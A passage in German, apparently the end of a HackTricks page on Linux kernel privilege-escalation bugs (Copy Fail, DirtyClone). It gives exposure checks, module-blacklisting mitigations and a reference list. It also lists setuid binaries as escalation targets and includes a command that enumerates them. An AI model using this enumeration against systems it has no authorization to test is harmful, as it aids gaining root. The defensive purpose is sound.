Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den clone path, während das Blockieren des Autoloads von `xt_TEE` den **flag-laundering-Schritt** und das Blockieren von `esp4` / `esp6` den **Decrypt-Sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure und Hunting

Wenn du diese Art von Bug vermutest, solltest du dich nicht allein auf Integritätsprüfungen der Festplatte verlassen. Überprüfe außerdem:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Die folgenden Konfigurationswerte unterscheiden zwischen einer ladbaren Schnittstelle und einer im Kernel integrierten Schnittstelle; die Crypto-Build-Regeln ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, ausreichen kann, um aus einem lokalen foothold Root-Zugriff zu machen

#### Angriffsflächenreduzierung für den `algif_aead`-Pfad

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Wenn es in den Kernel einkompiliert ist, wurde in einigen Berichten beschrieben, dass sich der Init-Pfad mit Folgendem blockieren lässt:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Diese Art der Abwehrmaßnahme sollte man auch bei anderen Kernel-LPEs im Hinterkopf behalten: Wenn die Ausnutzung von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Setzen dieser Schnittstelle auf eine Blacklist den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – Übernahme eines als root ausgeführten Skripts in einem für Benutzer beschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – häufig gestellte Fragen](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-Offenlegung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead – Zurück zum Out-of-place-Betrieb](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail – CVE-2026-31431-Sicherheitshinweis](https://copy.fail/)
- [7] [Theori / Xint – technischer Bericht](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Abwehrmaßnahme: `SKBFL_SHARED_FRAG` für gesplittete UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git-Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) – Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc – Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Zuordnungen von MIME-Anwendungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared-MIME-info-Spezifikation](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop-Entry-Spezifikation](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-crypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Schwachstelle im Page Cache des Linux-Kernels in AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf – HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git-Dokumentation zu `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git-Dokumentation zu `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-Konfigurationsdokumentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentation zum systemd-Generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs – Linux Detection Engineering: Persistenzmechanismen](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
